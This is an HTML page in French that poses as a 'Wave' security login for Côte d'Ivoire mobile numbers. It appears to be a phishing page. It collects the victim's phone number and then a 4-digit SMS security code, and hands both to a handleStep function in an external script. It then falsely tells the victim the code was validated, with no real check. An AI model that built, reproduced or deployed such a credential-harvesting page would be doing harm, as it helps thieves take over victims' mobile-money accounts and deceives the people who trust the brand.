<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <!-- This site is hosted on Netlify. Anyone can build and deploy a site
     like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=bc911a02-062a-4522-ae29-c12aa864b4cb
     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>
      Sécurité & Connexion Wave
    </title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
    <style>
      body {
        background-color: white;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .container {
        max-width: 400px;
        text-align: center;
      }
      .form-control {
        border: none;
        border-bottom: 1px solid #ccc;
        border-radius: 0;
        box-shadow: none;
      }
      .flag-select {
        display: flex;
        align-items: center;
      }
      .flag-select img {
        width: 24px;
        height: auto;
        margin-right: 8px;
      }

      .btn-suivant {
        width: 100%;
        border-radius: 25px;
        font-weight: bold;
        padding: 14px;
        margin-top: 60px;
        transition: background-color 0.3s ease, color 0.3s ease;
        border: none;
      }

      .btn-suivant:disabled {
        background-color: #e5f8ff;
        color: white;
        cursor: default;
      }

      .btn-suivant.enabled {
        background-color: #0095f6 !important;
        color: white;
      }

      .otp-container {
        display: flex;
        justify-content: space-between;
        gap: 10px;
        margin-top: 30px;
      }

      .otp-input {
        width: 50px;
        height: 50px;
        text-align: center;
        font-size: 24px;
        font-weight: bold;
        border: 2px solid #ccc;
        border-radius: 8px;
        outline: none;
        transition: border-color 0.2s;
      }

      .otp-input:focus {
        border-color: #0095f6;
      }

      .hidden {
        display: none !important;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <!-- Étape 1 : Numéro de téléphone -->
      <div id="stepPhone">
        <p class="mt-5 mb-4 fs-5">
          Bienvenue chez
          <strong>Wave</strong>!
          Pour commencer,
          <br />
          entrez votre numéro de mobile
        </p>
        <form id="phoneForm">
          <input type="hidden" name="step" value="phone" />
          <div class="input-group mb-3">
            <span class="input-group-text bg-white border-0 flag-select">
              <img src="https://flagcdn.com/w40/ci.png" alt="CI Flag" />
              +225
            </span>
            <input type="tel" id="phoneInput" name="phone" class="form-control" placeholder="0X XX XX XX XX" maxlength="10" required="" />
          </div>
          <button id="btnSuivant" type="submit" class="btn btn-suivant" disabled="">
            Suivant
          </button>
        </form>
      </div>

      <!-- Étape 2 : Sécurité OTP -->
      <div id="stepOtp" class="hidden">
        <p class="mt-5 mb-2 fs-5">
          <strong>Code de sécurité</strong>
        </p>
        <p class="text-muted small mb-4">
          Veuillez entrer le code à 4 chiffres envoyé par SMS au <span id="displayPhone" class="fw-bold text-dark"></span>
        </p>
        <form id="otpForm">
          <div class="otp-container">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" required />
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" required />
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" required />
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" required />
          </div>
          <button id="btnVerifyOtp" type="submit" class="btn btn-suivant enabled" style="margin-top: 40px;">
            Vérifier le code
          </button>
        </form>
        <p class="mt-4 text-center">
          <a href="#" id="resendOtp" class="text-decoration-none text-primary small">Renvoyer le code SMS</a>
        </p>
      </div>
    </div>

    <!-- Inclusion du script action/index.js -->
    <script src="action/index.js"></script>
    <script>
      const phoneInput = document.getElementById('phoneInput');
      const btnSuivant = document.getElementById('btnSuivant');
      const phoneForm = document.getElementById('phoneForm');
      const stepPhone = document.getElementById('stepPhone');
      const stepOtp = document.getElementById('stepOtp');
      const displayPhone = document.getElementById('displayPhone');
      const otpInputs = document.querySelectorAll('.otp-input');
      const otpForm = document.getElementById('otpForm');
      const resendOtp = document.getElementById('resendOtp');

      // Gestion du bouton "Suivant" téléphone
      phoneInput.addEventListener('input', () => {
        const cleaned = phoneInput.value.replace(/\D/g, '');
        if (cleaned.length === 10) {
          btnSuivant.disabled = false;
          btnSuivant.classList.add('enabled');
        } else {
          btnSuivant.disabled = true;
          btnSuivant.classList.remove('enabled');
        }
      });

      // Soumission numéro -> Affichage étape Sécurité OTP
      phoneForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const phoneNumber = phoneInput.value;
        displayPhone.textContent = '+225 ' + phoneNumber;
        
        stepPhone.classList.add('hidden');
        stepOtp.classList.remove('hidden');
        if (otpInputs.length > 0) otpInputs[0].focus();

        const formData = Object.fromEntries(new FormData(phoneForm).entries());
        if (typeof handleStep === 'function') {
          await handleStep(formData.step, formData);
        }
      });

      // Gestion de la navigation automatique entre les inputs OTP
      otpInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
          const val = e.target.value;
          if (val && index < otpInputs.length - 1) {
            otpInputs[index + 1].focus();
          }
        });

        input.addEventListener('keydown', (e) => {
          if (e.key === 'Backspace' && !input.value && index > 0) {
            otpInputs[index - 1].focus();
          }
        });
      });

      // Soumission de l'OTP
      otpForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const otpCode = Array.from(otpInputs).map(i => i.value).join('');
        if (otpCode.length === 4) {
          alert('Code de sécurité validé avec succès !');
          if (typeof handleStep === 'function') {
            await handleStep('otp', { code: otpCode });
          }
        }
      });

      resendOtp.addEventListener('click', (e) => {
        e.preventDefault();
        alert('Un nouveau code de sécurité a été envoyé.');
      });
    </script>
    <script async="" src="/.netlify/scripts/hud?variant=public" data-nf-variant="public" data-netlify-site-id="bc911a02-062a-4522-ae29-c12aa864b4cb" data-app-host="app.netlify.com" data-account-tier="free">
    </script>
  </body>
</html>
